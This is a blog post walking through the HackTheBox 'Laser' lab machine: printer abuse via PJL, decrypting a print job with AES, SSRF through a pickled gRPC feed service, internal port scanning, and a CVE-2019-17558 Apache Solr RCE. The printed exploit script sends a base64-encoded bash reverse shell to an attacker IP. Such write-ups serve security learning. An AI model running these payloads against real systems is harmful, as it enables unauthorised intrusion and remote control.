<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Introduction Laser Machine is rated as Insane level machine created by MrR3boot &amp;amp; r4j and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.
Enumeration We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap." />
<meta name="keywords" content=", Hackthebox, Printer Exploitation, gRPC, Internal Port Scanning, laser" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="purabparihar.github.io/posts/hackthebox-laser-insane-machine-writeup/" />


    <title>
        
            HackTheBox Laser : Insane Machine Writeup :: Purab Parihar 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/purabparihar.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="/purabparihar.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/purabparihar.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/purabparihar.github.io/favicon-16x16.png">
    <link rel="manifest" href="/purabparihar.github.io/site.webmanifest">
    <link rel="mask-icon" href="/purabparihar.github.io/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/purabparihar.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="HackTheBox Laser : Insane Machine Writeup">
<meta itemprop="description" content="Introduction Laser Machine is rated as Insane level machine created by MrR3boot &amp; r4j and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.
Enumeration We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap."><meta itemprop="datePublished" content="2022-10-13T19:34:33+05:30" />
<meta itemprop="dateModified" content="2022-10-13T20:45:47+05:30" />
<meta itemprop="wordCount" content="1297"><meta itemprop="image" content="purabparihar.github.io/47"/>
<meta itemprop="keywords" content="Hackthebox,Printer Exploitation,gRPC,Internal Port Scanning,laser," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="purabparihar.github.io/47"/>

<meta name="twitter:title" content="HackTheBox Laser : Insane Machine Writeup"/>
<meta name="twitter:description" content="Introduction Laser Machine is rated as Insane level machine created by MrR3boot &amp; r4j and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.
Enumeration We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap."/>



    <meta property="og:title" content="HackTheBox Laser : Insane Machine Writeup" />
<meta property="og:description" content="Introduction Laser Machine is rated as Insane level machine created by MrR3boot &amp; r4j and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.
Enumeration We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap." />
<meta property="og:type" content="article" />
<meta property="og:url" content="purabparihar.github.io/posts/hackthebox-laser-insane-machine-writeup/" /><meta property="og:image" content="purabparihar.github.io/47"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-13T19:34:33+05:30" />
<meta property="article:modified_time" content="2022-10-13T20:45:47+05:30" /><meta property="og:site_name" content="Purab Parihar" />







    <meta property="article:published_time" content="2022-10-13 19:34:33 &#43;0530 IST" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">Security Blogs</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/purabparihar.github.io/about">About</a></li><li><a href="/purabparihar.github.io/posts">Blog</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        7 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="purabparihar.github.io/posts/hackthebox-laser-insane-machine-writeup/">HackTheBox Laser : Insane Machine Writeup</a>
      </h1>

      

      
        <hr />
        <aside id="toc">
          <div class="toc-title">Table of Contents</div>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#printer-enumeration">Printer Enumeration</a></li>
      </ul>
    </li>
    <li><a href="#gaining-user-access">Gaining User Access</a>
      <ul>
        <li><a href="#decrypting-aes">Decrypting AES</a></li>
        <li><a href="#grpc-interaction">gRPC Interaction</a></li>
        <li><a href="#apache-solr-rce">Apache Solr RCE</a></li>
      </ul>
    </li>
    <li><a href="#getting-root">Getting Root</a></li>
  </ul>
</nav>
        </aside>
        <hr />

      

      <div class="post-content">
        <h2 id="introduction">Introduction</h2>
<p><img src="/images/Hackthebox/Laser/banner.jpeg" alt="Banner"></p>
<p>Laser Machine is rated as Insane level machine created by <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a> &amp; <a href="https://www.hackthebox.eu/home/users/profile/13243">r4j</a> and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.</p>
<h2 id="enumeration">Enumeration</h2>
<p><img src="/images/Hackthebox/Laser/Nmap.png" alt="NmapScan"></p>
<p>We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap. Let&rsquo;s search about port 9100 on google to see what this port is for.</p>
<h3 id="printer-enumeration">Printer Enumeration</h3>
<p><img src="/images/Hackthebox/Laser/Enumeration_on_9100.png" alt="NmapScan"></p>
<p>Google never leaves our hand! You can see that port 9100 jetdirect is used by printers. Umm Interesting so let&rsquo;s try to exploit printer on machine with PRET. PRET is tool for exploiting vulnerable printers.</p>
<p>This tool uses three different languages to interact with printer i.e PJL,PCL and PostScript. As we are performing pentest on a blackbox, We don&rsquo;t know that which language is being used by the printer so we&rsquo;ll try to use all these languages. Let&rsquo;s try first with PostScript</p>
<p><img src="/images/Hackthebox/Laser/PrinterExploit_ps.png" alt="PRET"></p>
<p>PostScript is not being used on the Printer as we can that PRET says Command Execution Failed so Let&rsquo;s try with PJL now.</p>
<p><img src="/images/Hackthebox/Laser/PrinterExploit_pjl.png" alt="PRET_PJL"></p>
<p>PJL worked! LaserCorp LaserJet 4ML is being used here as printer and now we can execute some commands to enumerate about printer. Let&rsquo;s try changing directories</p>
<p><img src="/images/Hackthebox/Laser/PRET_Dir.png" alt="PRET_DIR"></p>
<p>We found a file called &ldquo;queued&rdquo; so let&rsquo;s see contents in file with cat command</p>
<p><img src="/images/Hackthebox/Laser/queued.png" alt="File"></p>
<p>Seems a big file of base64 encoded string and now we can copy that base64 data to our system into file and then we&rsquo;ll see what type of data it is. Let&rsquo;s enumerate more on printer. Printenv command is available in PRET which shows the enviornment variables of the printer.</p>
<p><img src="/images/Hackthebox/Laser/PrintEnv.png" alt="Print_Env"></p>
<p>Printenv showed a enviornment variable ENCRYPTION_MODE=AES Yes! This could be useful later. There is one more option called NVRAM can be used to dump the memory and maybe this memory could be useful</p>
<p><img src="/images/Hackthebox/Laser/nvram_dump.png" alt="NVRAM_DUMP"></p>
<p>Laser Machine is rated as Insane level machine created by <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a> &amp; <a href="https://www.hackthebox.eu/home/users/profile/13243">r4j</a> and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -e <span style="color:#ed9d13">&#34;s#&#39;##g&#34;</span> queued | cut -c2- &gt; queued.b6
</span></span></code></pre></div><h2 id="gaining-user-access">Gaining User Access</h2>
<h3 id="decrypting-aes">Decrypting AES</h3>
<p>Now we have used sed (stream editor for filtering) to convert raw file to proper base64 and now let&rsquo;s try to decrypt AES now with this file</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Cipher</span> <span style="color:#6ab825;font-weight:bold">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">base64</span>,<span style="color:#447fcf;text-decoration:underline">struct</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;queued.b64&#34;</span>,<span style="color:#ed9d13">&#34;rb&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> data:
</span></span><span style="display:flex;"><span>    data = data.read().strip()
</span></span><span style="display:flex;"><span>    data = base64.b64decode(data)
</span></span><span style="display:flex;"><span>    size, iv,ciphertext = (data[<span style="color:#3677a9">0</span>:<span style="color:#3677a9">8</span>],data[<span style="color:#3677a9">8</span>:<span style="color:#3677a9">24</span>],data[<span style="color:#3677a9">24</span>:])
</span></span><span style="display:flex;"><span>    key = <span style="color:#ed9d13">&#34;13vu94r6643rv19u&#34;</span>.encode()
</span></span><span style="display:flex;"><span>    cipher = AES.new(key,AES.MODE_CBC,iv)
</span></span><span style="display:flex;"><span>    decrypted = cipher.decrypt(ciphertext)
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;decrypted&#34;</span>,<span style="color:#ed9d13">&#34;wb&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> output:
</span></span><span style="display:flex;"><span>        output.write(decrypted)
</span></span></code></pre></div><h3 id="grpc-interaction">gRPC Interaction</h3>
<p>AES got decrypted and now we have a PDF Documentation about Feed Engine v1.0 so let&rsquo;s see what hints we can get from there</p>
<p><img src="/images/Hackthebox/Laser/Documentation.png" alt="Doc"></p>
<p>Points to notice :</p>
<pre tabindex="0"><code>Engine runs on 9000 Port which we got from nmap
Uses gRPC for Interaction
Protobuf (Google Protocol Buffer) are used with gRPC
</code></pre><p>For interaction with service we have to understand the message structure first and gRPC <a href="https://grpc.io/docs/what-is-grpc/introduction/">documentation</a> comes in handy here.Let&rsquo;s read decrypted PDF more and There is a sample code as well in pdf and some more hints!!</p>
<p><img src="/images/Hackthebox/Laser/Service.png" alt="Service"></p>
<p>As per documentation we have to create a service called <strong>Print</strong> with method <strong>Feed</strong> which takes parameter <strong>Content</strong> as input and <strong>Data</strong> as output</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>syntax = <span style="color:#ed9d13">&#34;proto3&#34;</span>;
</span></span><span style="display:flex;"><span>service Print{
</span></span><span style="display:flex;"><span>    rpc Feed (Content) returns (Data) {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now we have to define <strong>Content</strong> and <strong>Data</strong>. <strong>Content</strong> holds memeber called <strong>data</strong> and <strong>Data</strong> holds feed.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>syntax = <span style="color:#ed9d13">&#34;proto3&#34;</span>;
</span></span><span style="display:flex;"><span>service Print{
</span></span><span style="display:flex;"><span>    rpc Feed (Content) returns (Data) {}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>message Content{
</span></span><span style="display:flex;"><span>    string data=<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>message Data{
</span></span><span style="display:flex;"><span>    string feed=<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now we have to save this data in a file laser.proto . Now we have to use python to interact with Service</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pip3 install grpcio-tools
</span></span><span style="display:flex;"><span>pip3 install grpcio
</span></span></code></pre></div><p>Once we have installed both modules, We have to generate gRPC classes for python</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
</span></span></code></pre></div><p>Let&rsquo;s create a python script to interact with gRPC</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">grpc</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">laser_pb2</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">laser_pb2_grpc</span>
</span></span><span style="display:flex;"><span>channel = grpc.insecure_channel(<span style="color:#ed9d13">&#34;10.10.10.201:9000&#34;</span>)
</span></span><span style="display:flex;"><span>stub = laser_pb2_grpc.PrintStub(channel)
</span></span><span style="display:flex;"><span>data = stub.Feed(laser_pb2.Content(data = <span style="color:#ed9d13">&#34;abcde&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#24909d">print</span>(data.feed)
</span></span></code></pre></div><p>We have created a server using <strong>insecure_channel</strong>, PrintStub to invoke methods, Feed is stub object and we call it using<strong>Feed</strong>and We sent input <strong>using Content</strong> with data and returned <strong>Data</strong> using <strong>feed</strong>.</p>
<p><img src="/images/Hackthebox/Laser/base64_error.png" alt="base64_err"></p>
<p>We got error which says <strong>Invalid base64-encoded string</strong> means the gRPC requieres base64 string in order to communicate with service. Let&rsquo;s change string to base64</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>data = stub.Feed(laser_pb2.Content(data = <span style="color:#ed9d13">&#34;YWJjZGU=&#34;</span>))
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/unpickle.png" alt="unpickle"></p>
<p>Now the error says that <strong>unpickling stack underflow</strong> it means the gRPC doesn&rsquo;t accept unpickled (desearialized) objects so we can use pickle method to serialize the objects.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sys</span>, <span style="color:#447fcf;text-decoration:underline">pickle</span>, <span style="color:#447fcf;text-decoration:underline">base64</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">grpc</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2_grpc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#ed9d13">&#39;{&#34;feed_url&#34;:&#34;http://10.10.14.12:1337&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>payload = base64.b64encode(pickle.dumps(payload))
</span></span><span style="display:flex;"><span>channel = grpc.insecure_channel(<span style="color:#ed9d13">&#39;10.10.10.201:9000&#39;</span>)
</span></span><span style="display:flex;"><span>stub = laser_pb2_grpc.PrintStub(channel)
</span></span><span style="display:flex;"><span>content = laser_pb2.Content(data=payload)
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>    response = stub.Feed(content, timeout=<span style="color:#3677a9">10</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#24909d">print</span>(response)
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">Exception</span> <span style="color:#6ab825;font-weight:bold">as</span> ex:
</span></span><span style="display:flex;"><span>    <span style="color:#24909d">print</span>(ex)
</span></span></code></pre></div><p>Run this python file and listen to 1337 on another terminal</p>
<p><img src="/images/Hackthebox/Laser/Reply_from_nc.png" alt="Reply_NC"></p>
<p>Now we are reciveing connection from the machine! Now we have to create another python script which will be basic port scanner so that we can scan internal ports from the machine network.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sys</span>, <span style="color:#447fcf;text-decoration:underline">pickle</span>, <span style="color:#447fcf;text-decoration:underline">base64</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">grpc</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2_grpc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">for</span> port <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">1</span>, <span style="color:#3677a9">65536</span>):
</span></span><span style="display:flex;"><span>    payload = <span style="color:#ed9d13">&#39;{&#34;feed_url&#34;:&#34;http://localhost:&#39;</span> + <span style="color:#24909d">str</span>(port) + <span style="color:#ed9d13">&#39;&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>    payload = base64.b64encode(pickle.dumps(payload))
</span></span><span style="display:flex;"><span>    channel = grpc.insecure_channel(<span style="color:#ed9d13">&#39;10.10.10.201:9000&#39;</span>)
</span></span><span style="display:flex;"><span>    stub = laser_pb2_grpc.PrintStub(channel)
</span></span><span style="display:flex;"><span>    content = laser_pb2.Content(data=payload)
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>        response = stub.Feed(content, timeout=<span style="color:#3677a9">10</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">print</span>(port, response)
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">Exception</span> <span style="color:#6ab825;font-weight:bold">as</span> ex:
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#39;Connection refused&#39;</span> <span style="color:#6ab825;font-weight:bold">in</span> ex.details():
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">print</span>(port)
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/PortScan.png" alt="Internal_Port_Scan"></p>
<p>We have enumerated 2 Internal Ports :</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#3677a9">7983</span>
</span></span><span style="display:flex;"><span><span style="color:#3677a9">8983</span> feed: <span style="color:#ed9d13">&#34;Pushing feeds&#34;</span>
</span></span></code></pre></div><h3 id="apache-solr-rce">Apache Solr RCE</h3>
<p>Port 8983 uses Apache Solr RCE <a href="https://github.com/veracode-research/solr-injection#7-cve-2019-17558-rce-via-velocity-template-by-_s00py">Exploit</a></p>
<p>So we are going to use a exploit coded in python for getting reverse shell by exploiting the CVE-2019-17558</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sys</span>,<span style="color:#447fcf;text-decoration:underline">pickle</span>,<span style="color:#447fcf;text-decoration:underline">base64</span>,<span style="color:#447fcf;text-decoration:underline">subprocess</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#ed9d13">&#39;bash -c {echo,&#39;</span> + base64.b64encode(<span style="color:#ed9d13">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#34;</span>).replace(<span style="color:#ed9d13">&#39;+&#39;</span>,<span style="color:#ed9d13">&#39;%2b&#39;</span>) + <span style="color:#ed9d13">&#39;}|{base64,-d}|{bash,-i}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">send_url</span>(url):
</span></span><span style="display:flex;"><span>  feed_url = <span style="color:#ed9d13">&#39;{&#34;feed_url&#34;: &#34;gopher://localhost:8983/_&#39;</span> + url + <span style="color:#ed9d13">&#39;&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#24909d">print</span>(feed_url)
</span></span><span style="display:flex;"><span>  feed_url_b64 = base64.b64encode(pickle.dumps(feed_url))
</span></span><span style="display:flex;"><span>  cmd = <span style="color:#ed9d13">&#39;./grpcurl -max-time 5 -plaintext -proto laser.proto -d </span><span style="color:#ed9d13">\&#39;</span><span style="color:#ed9d13">{&#34;data&#34;:&#34;&#39;</span> + feed_url_b64 + <span style="color:#ed9d13">&#39;&#34;}</span><span style="color:#ed9d13">\&#39;</span><span style="color:#ed9d13"> 10.10.10.201:9000 Print.Feed&#39;</span>
</span></span><span style="display:flex;"><span>  subprocess.call(cmd,shell=<span style="color:#6ab825;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">enc</span>(data):
</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#24909d">str</span>(data.replace(<span style="color:#ed9d13">&#39;%&#39;</span>,<span style="color:#ed9d13">&#39;%25&#39;</span>).replace(<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>,<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">%0d%0a</span><span style="color:#ed9d13">&#39;</span>).replace(<span style="color:#ed9d13">&#39;&#34;&#39;</span>,<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">url_get</span>(header,req):
</span></span><span style="display:flex;"><span>  send_url(enc(req) + enc(header))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">url_post</span>(header,body):
</span></span><span style="display:flex;"><span>  send_url(enc(header) + <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">%0d%0a%0d%0a</span><span style="color:#ed9d13">&#34;</span> + enc(body)) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>body = <span style="color:#ed9d13">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">{
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">  &#34;update-queryresponsewriter&#34;: {
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;startup&#34;: &#34;lazy&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;name&#34;: &#34;velocity&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;class&#34;: &#34;solr.VelocityResponseWriter&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;template.base.dir&#34;: &#34;&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;solr.resource.loader.enabled&#34;: &#34;true&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;params.resource.loader.enabled&#34;: &#34;true&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">  }
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">}&#34;&#34;&#34;</span>.strip().replace(<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>,<span style="color:#ed9d13">&#39;&#39;</span>).replace(<span style="color:#ed9d13">&#39; &#39;</span>,<span style="color:#ed9d13">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>header = <span style="color:#ed9d13">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">POST /solr/staging/config HTTP/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">Host: localhost:8983
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">Content-Type: application/json
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">Content-Length: </span><span style="color:#ed9d13">{}</span><span style="color:#ed9d13">
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">&#34;&#34;&#34;</span>.format(<span style="color:#24909d">len</span>(body)).strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_post(header,body)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>header = <span style="color:#ed9d13">&#39; HTTP/1.1</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">Host: localhost:8983</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>
</span></span><span style="display:flex;"><span>template = <span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($x=</span><span style="color:#ed9d13">%27%</span><span style="color:#ed9d13">27)+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($rt=$x.class.forName(%27java.lang.Runtime%27))+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($chr=$x.class.forName(%27java.lang.Character%27))+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($str=$x.class.forName(%27java.lang.String%27))+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($ex=$rt.getRuntime().exec(&#34;PAYLOAD&#34;))+$ex.waitFor()+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($out=$ex.getInputStream())+</span><span style="color:#ed9d13">%23f</span><span style="color:#ed9d13">oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><span style="color:#ed9d13">%23e</span><span style="color:#ed9d13">nd&#39;</span>
</span></span><span style="display:flex;"><span>req = <span style="color:#ed9d13">&#39;GET /solr/staging/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=&#39;</span> + template.replace(<span style="color:#ed9d13">&#39;PAYLOAD&#39;</span>,payload).replace(<span style="color:#ed9d13">&#39; &#39;</span>,<span style="color:#ed9d13">&#39;%20&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_get(header,req)
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/RevShell.png" alt="RevShell">
BOOM! We got user shell :)
Let&rsquo;s enumerate the system for priviledge escalation.</p>
<h2 id="getting-root">Getting Root</h2>
<p>The current shell is not much stable so let&rsquo;s add our ssh keys into authorized_keys for solr and
Now Let&rsquo;s upload <a href="https://github.com/DominicBreuker/pspy">PsPy</a> to machine using curl. Pspy snoops processes without root permisson.</p>
